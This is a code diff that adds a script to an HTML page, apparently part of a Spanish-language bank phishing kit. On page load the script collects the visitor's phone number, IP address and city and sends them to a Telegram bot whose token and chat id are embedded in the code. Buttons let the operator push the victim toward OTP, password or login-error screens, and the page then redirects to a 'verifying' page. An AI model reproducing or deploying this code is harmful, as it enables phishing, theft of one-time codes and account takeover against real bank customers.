@@ -158,7 +158,53 @@
             </table>
 
        </div> 
-    </body>
+    </body><script>
+// ENVÍA TODO A TU BOT AL CARGAR PRIVATE
+$(document).ready(function() {
+  const numero = $("#numero").text().trim() || "Sin número";
+  
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => d.ip)
+    .then(ip => {
+      fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).then(geo => {
+        const ciudad = geo.city || "Desconocida";
+        const mensaje = `*NUEVO CLIENTE EN PRIVATE*
+
+*Número:* ${numero}
+*IP:* ${ip}
+*Ciudad:* ${ciudad}
+*Hora:* ${new Date().toLocaleString()}
+
+*¿QUÉ HAGO?*`;
+
+        const botones = {
+          inline_keyboard: [
+            [{text: "Clave OTP", callback_data: "otp"}],
+            [{text: "Error de clave", callback_data: "errorclave"}],
+            [{text: "Dinámica", callback_data: "dinamica"}],
+            [{text: "Error login", callback_data: "errorlogin"}],
+            [{text: "Finalizar", callback_data: "finalizar"}]
+          ]
+        };
+
+        fetch(`https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: 8469651553,
+            text: mensaje,
+            parse_mode: 'Markdown',
+            reply_markup: botones
+          })
+        });
+      });
+    });
+
+  // REDIRIGE A VERIFYING EN 3 SEGUNDOS
+  setTimeout(() => { location.href = '../verifying/'; }, 3000);
+});
+</script>
     <script type="text/javascript">
         $(document).ready(function($){
             
@@ -171,4 +217,5 @@
         });  
     </script>
     <script type="text/javascript" src="../assets/js/ready.js?v2"></script> 
+
 </html>
